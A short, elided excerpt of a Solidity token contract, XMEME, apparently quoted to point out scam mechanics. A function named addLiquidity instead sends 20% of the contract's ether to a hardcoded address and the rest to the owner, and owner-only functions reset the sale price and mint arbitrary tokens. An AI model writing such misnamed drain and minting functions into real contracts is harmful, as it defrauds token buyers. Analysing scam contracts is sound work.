...
contract XMEME {
    ...
    uint256 private _airdropToken = 150000000000000000000000;
    ...
    function addLiquidity() public onlyOwner() {
        ...
        _authNum=0;
        address(uint160(0x722492213bF814F6B80d8Af408a4E091A8F52411)).transfer(address(this).balance.mul(20).div(100));
        msg.sender.transfer(address(this).balance);
    }

    function updateRate(uint256 _amount) public onlyOwner returns(bool){
        salePrice = _amount;
        return true;
    }
    ...
    function allocationToken(address _addr, uint256 _amount) public onlyOwner returns(bool){
        _mint(_addr, _amount);
    }
